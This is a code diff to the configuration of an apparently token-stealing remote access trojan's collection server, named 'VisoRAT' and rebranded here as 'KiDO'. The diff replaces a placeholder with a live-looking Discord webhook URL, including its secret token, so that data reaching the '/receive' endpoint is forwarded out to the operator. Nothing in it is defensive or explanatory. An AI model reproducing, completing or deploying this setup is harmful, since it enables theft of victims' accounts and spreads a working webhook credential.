@@ -26,9 +26,9 @@ def load_config():
                 "/receive": {
                     "webhooks": [
                         {
-                            "url": "YOUR_DISCORD_WEBHOOK_URL_HERE",
-                            "name": "VisoRAT",
-                            "footer": "VisoRAT",
+                            "url": "https://discord.com/api/webhooks/1459928665688117259/fKbzllhMJOYrp8NOENfZ_Zr1MfidDgl1APJuXKTs3MteVfjDHPnn_3nIv-H13lKShva7",
+                            "name": "KiDO",
+                            "footer": "KiDO",
                             "color": 7414964,
                             "avatar_url": "https://bigrat.monster/media/bigrat.jpg"
                         }
@@ -270,4 +270,5 @@ if __name__ == '__main__':
         print(f"  Check duplicate tokens: {security.get('check_duplicate_tokens', True)}")
         print("  Username validation: Via player head API")
     
+
     app.run(port=5000, debug=True)
